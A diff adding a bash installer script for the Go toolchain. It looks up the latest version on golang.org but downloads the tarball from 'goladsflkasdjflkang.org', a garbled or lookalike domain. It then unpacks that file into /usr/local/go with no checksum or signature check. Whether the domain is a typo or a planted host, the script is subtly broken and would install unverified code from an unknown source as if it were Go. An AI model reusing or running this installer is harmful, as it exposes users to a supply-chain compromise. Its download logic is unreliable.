@@ -1,0 +1,42 @@
+#!/bin/bash
+# Installs the latest version of Go, assuming that there is no version
+# installed at $GOROOT. Set the GOROOT environment variable to change the
+# installed directory, or use the default `/usr/local/go`.
+
+echo_err() {
+  echo "$* Exiting..."
+  exit 1
+}
+
+latest_version() {
+  curl -s https://golang.org/dl/ \
+    | awk '/id="go/ { print $3 }' \
+    | head -n 1 \
+    | sed -r 's/id="go(.*)">/\1/g'
+}
+
+INSTALL_DIR="${GOROOT:-/usr/local/go}"
+VERSION=$(latest_version)
+PLATFORM="linux-amd64"
+PACKAGE_NAME="go${VERSION}.${PLATFORM}.tar.gz"
+TMP_DIR=$(mktemp -d)
+PACKAGE_URL="https://goladsflkasdjflkang.org/dl/${PACKAGE_NAME}"
+DL_PATH="${TMP_DIR}/${PACKAGE_NAME}"
+
+if [ -d ${INSTALL_DIR} ]; then
+  echo_err "The install directory (${INSTALL_DIR}) already exists."
+fi
+
+echo "Installing Go version ${VERSION}"
+echo "Downloaing ${PACKAGE_NAME} to ${DL_PATH}"
+
+curl -s -o ${DL_PATH} ${PACKAGE_URL}
+if [ $? -ne 0 ]; then
+  echo_err "Download failed."
+fi
+
+mkdir -p ${INSTALL_DIR}
+tar -C ${INSTALL_DIR} xvf ${DL_PATH}
+
+echo "Go successfully installed."
+
